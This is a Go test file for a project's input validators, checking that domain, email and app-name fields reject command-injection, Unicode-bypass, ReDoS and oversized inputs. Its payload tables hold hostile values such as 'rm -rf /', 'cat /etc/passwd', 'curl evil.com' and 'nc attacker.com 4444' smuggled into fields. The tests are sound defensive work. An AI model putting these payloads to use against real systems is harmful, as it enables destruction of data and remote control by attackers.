package crypto

import (
	"os"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// TestCommandInjectionPrevention tests domain validation against command injection attacks
func TestCommandInjectionPrevention(t *testing.T) {
	// Set production environment to ensure all security checks are active
	originalEnv := os.Getenv("GO_ENV")
	_ = os.Setenv("GO_ENV", "production") // Test setup, error not critical
	defer func() {
		if originalEnv == "" {
			_ = os.Unsetenv("GO_ENV") // Test cleanup, error not critical
		} else {
			_ = os.Setenv("GO_ENV", originalEnv) // Test cleanup, error not critical
		}
	}()

	injectionPayloads := []struct {
		name    string
		payload string
		field   string // domain, email, or appname
	}{
		// Command injection via semicolons
		{"semicolon_command", "example.com;rm -rf /", "domain"},
		{"double_semicolon", "test.com;;cat /etc/passwd", "domain"},

		// Pipe-based command injection
		{"pipe_command", "example.com|whoami", "domain"},
		{"double_pipe", "test.com||curl evil.com", "domain"},

		// Backtick command substitution
		{"backtick_command", "example.com`id`", "domain"},
		{"backtick_nested", "test.com`cat /etc/hosts`", "domain"},

		// Dollar sign variable/command substitution
		{"dollar_command", "example.com$(whoami)", "domain"},
		{"dollar_variable", "test.com$HOME", "domain"},

		// Ampersand background execution
		{"ampersand_bg", "example.com&ping evil.com", "domain"},
		{"double_ampersand", "test.com&&curl attacker.com", "domain"},

		// Newline/carriage return injection
		{"newline_injection", "example.com\nrm -rf /", "domain"},
		{"carriage_return", "test.com\rcurl evil.com", "domain"},
		{"crlf_injection", "example.com\r\nwget malware.exe", "domain"},

		// Quote escaping attempts
		{"single_quote", "example.com'", "domain"},
		{"double_quote", "example.com\"", "domain"},
		{"quote_escape", "example.com\\'", "domain"},

		// Redirection attempts
		{"redirect_output", "example.com>output.txt", "domain"},
		{"redirect_input", "example.com<input.txt", "domain"},
		{"append_redirect", "example.com>>log.txt", "domain"},

		// Null byte injection
		{"null_byte", "example.com\x00", "domain"},
		{"null_byte_command", "example.com\x00rm -rf /", "domain"},

		// Email field injection attacks
		{"email_semicolon", "user@example.com;curl evil.com", "email"},
		{"email_pipe", "user@test.com|nc attacker.com 4444", "email"},
		{"email_backtick", "user@example.com`whoami`", "email"},
		{"email_newline", "user@test.com\nrm -rf /", "email"},

		// App name injection attacks
		{"app_semicolon", "myapp;rm -rf /", "appname"},
		{"app_pipe", "myapp|whoami", "appname"},
		{"app_backtick", "myapp`id`", "appname"},
		{"app_dollar", "myapp$(curl evil.com)", "appname"},
	}

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			var err error

			switch tc.field {
			case "domain":
				err = ValidateDomainName(tc.payload)
			case "email":
				err = ValidateEmailAddress(tc.payload)
			case "appname":
				err = ValidateAppName(tc.payload)
			}

			// All injection attempts should be rejected
			testutil.AssertError(t, err)

			// Verify error message doesn't expose the dangerous payload
			if err != nil {
				errorMsg := err.Error()
				// Error should mention invalid character but not echo the full payload
				testutil.AssertContains(t, errorMsg, "invalid character")

				// Ensure dangerous parts aren't reflected in error
				dangerousChars := []string{";", "|", "`", "$", "&", "\n", "\r"}
				for _, dangerous := range dangerousChars {
					if strings.Contains(tc.payload, dangerous) && strings.Contains(errorMsg, dangerous) {
						t.Errorf("Error message contains dangerous character '%s': %s", dangerous, errorMsg)
					}
				}
			}
		})
	}
}

// TestUnicodeNormalizationAttacks tests against Unicode-based bypass attempts
func TestUnicodeNormalizationAttacks(t *testing.T) {
	unicodePayloads := []struct {
		name    string
		payload string
		field   string
	}{
		// Unicode normalization bypasses
		{"unicode_semicolon", "example.com\uFF1Brm -rf /", "domain"}, // Fullwidth semicolon
		{"unicode_pipe", "test.com\uFF5Cwhoami", "domain"},           // Fullwidth vertical bar
		{"unicode_backtick", "example.com\uFF40id\uFF40", "domain"},  // Fullwidth grave accent

		// Zero-width characters
		{"zero_width_space", "example\u200B.com", "domain"},
		{"zero_width_joiner", "test\u200D.com", "domain"},
		{"zero_width_non_joiner", "example\u200C.com", "domain"},

		// Invisible characters
		{"invisible_separator", "example\u2063.com", "domain"}, // Invisible separator
		{"invisible_times", "test\u2062.com", "domain"},        // Invisible times

		// Homograph attacks
		{"cyrillic_a", "еxample.com", "domain"},   // Cyrillic 'е' instead of 'e'
		{"mixed_script", "exаmple.com", "domain"}, // Mixed Latin/Cyrillic

		// RTL/LTR override attacks
		{"rtl_override", "example\u202E.com", "domain"},
		{"ltr_override", "test\u202D.com", "domain"},

		// Email Unicode attacks
		{"email_unicode_semicolon", "user@example.com\uFF1Bcurl evil.com", "email"},
		{"email_zero_width", "user\u200B@test.com", "email"},

		// App name Unicode attacks
		{"app_unicode_pipe", "myapp\uFF5Cwhoami", "appname"},
		{"app_zero_width", "my\u200Bapp", "appname"},
	}

	for _, tc := range unicodePayloads {
		t.Run(tc.name, func(t *testing.T) {
			var err error

			switch tc.field {
			case "domain":
				err = ValidateDomainName(tc.payload)
			case "email":
				err = ValidateEmailAddress(tc.payload)
			case "appname":
				err = ValidateAppName(tc.payload)
			}

			// All Unicode-based bypass attempts should be rejected
			testutil.AssertError(t, err)
		})
	}
}

// TestRegexCatastrophicBacktracking tests for ReDoS (Regular Expression Denial of Service)
func TestRegexCatastrophicBacktracking(t *testing.T) {
	// These patterns are designed to cause exponential backtracking in poorly written regexes
	backtrackingPayloads := []struct {
		name    string
		payload string
		field   string
	}{
		// Nested quantifiers that could cause exponential backtracking
		{"nested_quantifiers_domain", strings.Repeat("a", 100) + "!" + strings.Repeat("a", 100) + ".com", "domain"},
		{"alternation_bomb_domain", strings.Repeat("(a|a)", 20) + ".com", "domain"},

		// Email regex bombs
		{"email_alternation_bomb", strings.Repeat("(a|a)", 15) + "@test.com", "email"},
		{"email_nested_quantifiers", strings.Repeat("a", 50) + "!" + strings.Repeat("a", 50) + "@example.com", "email"},

		// App name regex bombs
		{"app_alternation_bomb", strings.Repeat("(a|a)", 15), "appname"},
		{"app_nested_quantifiers", strings.Repeat("a", 30) + "!" + strings.Repeat("a", 30), "appname"},

		// Pathological cases for domain validation
		{"pathological_subdomain", strings.Repeat("a", 63) + "." + strings.Repeat("b", 63) + ".com", "domain"},
		{"many_dots", strings.Repeat("a.", 50) + "com", "domain"},
	}

	for _, tc := range backtrackingPayloads {
		t.Run(tc.name, func(t *testing.T) {
			// Use a timeout to detect if regex takes too long (potential ReDoS)
			done := make(chan bool, 1)
			var err error

			go func() {
				switch tc.field {
				case "domain":
					err = ValidateDomainName(tc.payload)
				case "email":
					err = ValidateEmailAddress(tc.payload)
				case "appname":
					err = ValidateAppName(tc.payload)
				}
				done <- true
			}()

			select {
			case <-done:
				// Validation completed - should have been rejected
				testutil.AssertError(t, err)
			case <-testutil.Timeout(t, "5s"):
				t.Errorf("Regex validation took too long (potential ReDoS): %s", tc.payload)
			}
		})
	}
}

// TestLengthBasedAttacks tests buffer overflow and resource exhaustion attempts
func TestLengthBasedAttacks(t *testing.T) {
	lengthAttacks := []struct {
		name      string
		generator func() string
		field     string
		minLength int
	}{
		// Domain length attacks
		{"max_domain_length", func() string { return strings.Repeat("a", MaxDomainLength+1) + ".com" }, "domain", MaxDomainLength},
		{"huge_domain", func() string { return strings.Repeat("a", 1000) + ".com" }, "domain", MaxDomainLength},
		{"mega_domain", func() string { return strings.Repeat("a", 10000) + ".com" }, "domain", MaxDomainLength},

		// Email length attacks
		{"max_email_length", func() string { return strings.Repeat("a", MaxEmailLength-10) + "@test.com" }, "email", MaxEmailLength},
		{"huge_email", func() string { return strings.Repeat("a", 1000) + "@example.com" }, "email", MaxEmailLength},

		// App name length attacks
		{"max_app_length", func() string { return strings.Repeat("a", MaxAppNameLength+1) }, "appname", MaxAppNameLength},
		{"huge_app_name", func() string { return strings.Repeat("a", 500) }, "appname", MaxAppNameLength},

		// Label length attacks (DNS label limit)
		{"oversized_label", func() string { return strings.Repeat("a", 64) + ".com" }, "domain", 63},
		{"multiple_oversized", func() string { return strings.Repeat("a", 64) + "." + strings.Repeat("b", 64) + ".com" }, "domain", 63},
	}

	for _, tc := range lengthAttacks {
		t.Run(tc.name, func(t *testing.T) {
			payload := tc.generator()
			var err error

			switch tc.field {
			case "domain":
				err = ValidateDomainName(payload)
			case "email":
				err = ValidateEmailAddress(payload)
			case "appname":
				err = ValidateAppName(payload)
			}

			// All length-based attacks should be rejected
			testutil.AssertError(t, err)

			// Verify error mentions length limit
			if err != nil {
				errorMsg := strings.ToLower(err.Error())
				if !strings.Contains(errorMsg, "too long") && !strings.Contains(errorMsg, "length") {
					t.Errorf("Length-based attack error should mention length: %s", err.Error())
				}
			}
		})
	}
}

// TestSuspiciousDomainDetection tests detection of suspicious/dangerous domains
func TestSuspiciousDomainDetection(t *testing.T) {
	suspiciousDomains := []string{
		// Localhost variations
		"localhost",
		"127.0.0.1",
		"::1",
		"0.0.0.0",

		// Internal domains
		"internal",
		"local",
		"*.local",
		"*.internal",
		"app.local",
		"service.internal",

		// Mixed case attempts
		"LocalHost",
		"INTERNAL",
		"Local",

		// Subdomain attempts
		"test.localhost",
		"app.internal",
		"service.local",
	}

	for _, domain := range suspiciousDomains {
		t.Run("suspicious_"+strings.ReplaceAll(domain, ".", "_"), func(t *testing.T) {
			err := ValidateDomainName(domain)
			testutil.AssertError(t, err)

			if err != nil {
				errorMsg := strings.ToLower(err.Error())
				testutil.AssertContains(t, errorMsg, "suspicious")
			}
		})
	}
}

// TestReservedNameValidation tests protection against reserved application names
func TestReservedNameValidation(t *testing.T) {
	// Set production environment to ensure reserved name checking is active
	originalEnv := os.Getenv("GO_ENV")
	_ = os.Setenv("GO_ENV", "production") // Test setup, error not critical
	defer func() {
		if originalEnv == "" {
			_ = os.Unsetenv("GO_ENV") // Test cleanup, error not critical
		} else {
			_ = os.Setenv("GO_ENV", originalEnv) // Test cleanup, error not critical
		}
	}()

	criticalReservedNames := []string{
		"admin", "root", "system", "daemon", "www", "ftp", "mail",
	}

	productionReservedNames := []string{
		"api", "app", "web", "db", "database", "cache", "redis",
		"vault", "consul", "docker", "kubernetes", "k8s",
	}

	// Critical names should always be blocked
	for _, name := range criticalReservedNames {
		t.Run("critical_reserved_"+name, func(t *testing.T) {
			err := ValidateAppName(name)
			testutil.AssertError(t, err)
			testutil.AssertContains(t, err.Error(), "reserved")
		})

		// Test case variations
		t.Run("critical_reserved_upper_"+name, func(t *testing.T) {
			err := ValidateAppName(strings.ToUpper(name))
			testutil.AssertError(t, err)
		})
	}

	// Production reserved names should be blocked in production
	for _, name := range productionReservedNames {
		t.Run("production_reserved_"+name, func(t *testing.T) {
			err := ValidateAppName(name)
			testutil.AssertError(t, err)
			testutil.AssertContains(t, err.Error(), "reserved")
		})
	}
}

// TestCertificateInputCombinations tests validation of combined certificate inputs
func TestCertificateInputCombinations(t *testing.T) {
	maliciousCombinations := []struct {
		name       string
		appName    string
		baseDomain string
		email      string
	}{
		{
			name:       "injection_combination",
			appName:    "app;rm -rf /",
			baseDomain: "example.com",
			email:      "user@test.com",
		},
		{
			name:       "fqdn_overflow",
			appName:    strings.Repeat("a", 100),
			baseDomain: strings.Repeat("b", 200) + ".com",
			email:      "user@test.com",
		},
		{
			name:       "mixed_injection",
			appName:    "app",
			baseDomain: "example.com|whoami",
			email:      "user@test.com;curl evil.com",
		},
		{
			name:       "unicode_mixed",
			appName:    "app\u200B",
			baseDomain: "еxample.com", // Cyrillic е
			email:      "user\uFF40@test.com",
		},
		{
			name:       "all_suspicious",
			appName:    "admin",
			baseDomain: "localhost",
			email:      "root@internal",
		},
	}

	for _, tc := range maliciousCombinations {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateAllCertificateInputs(tc.appName, tc.baseDomain, tc.email)
			testutil.AssertError(t, err)
		})
	}
}

// TestSanitizationEffectiveness tests the SanitizeInputForCommand function
func TestSanitizationEffectiveness(t *testing.T) {
	sanitizationTests := []struct {
		name     string
		input    string
		expected string
	}{
		{"remove_semicolon", "cmd;rm", "cmdrm"},
		{"remove_pipe", "cmd|whoami", "cmdwhoami"},
		{"remove_backtick", "cmd`id`", "cmdid"},
		{"remove_dollar", "cmd$HOME", "cmdHOME"},
		{"remove_ampersand", "cmd&bg", "cmdbg"},
		{"remove_quotes", "cmd'test\"", "cmdtest"},
		{"remove_newlines", "cmd\ntest\r", "cmdtest"},
		{"remove_null_bytes", "cmd\x00test", "cmdtest"},
		{"remove_backslash", "cmd\\test", "cmdtest"},
		{"preserve_safe", "cmd-test.txt", "cmd-test.txt"},
		{"complex_injection", "cmd;rm|whoami`id`$HOME", "cmdrmwhoamiidHOME"},
	}

	for _, tc := range sanitizationTests {
		t.Run(tc.name, func(t *testing.T) {
			result := SanitizeInputForCommand(tc.input)
			testutil.AssertEqual(t, tc.expected, result)
		})
	}
}

// BenchmarkValidationPerformance ensures validation functions perform adequately under load
func BenchmarkValidationPerformance(b *testing.B) {
	testInputs := []struct {
		name     string
		function func() error
	}{
		{"domain_valid", func() error { return ValidateDomainName("example.com") }},
		{"domain_invalid", func() error { return ValidateDomainName("example.com;rm") }},
		{"email_valid", func() error { return ValidateEmailAddress("user@example.com") }},
		{"email_invalid", func() error { return ValidateEmailAddress("user@example.com|whoami") }},
		{"appname_valid", func() error { return ValidateAppName("myapp") }},
		{"appname_invalid", func() error { return ValidateAppName("myapp;rm") }},
	}

	for _, tc := range testInputs {
		b.Run(tc.name, func(b *testing.B) {
			for i := 0; i < b.N; i++ {
				_ = tc.function()
			}
		})
	}
}
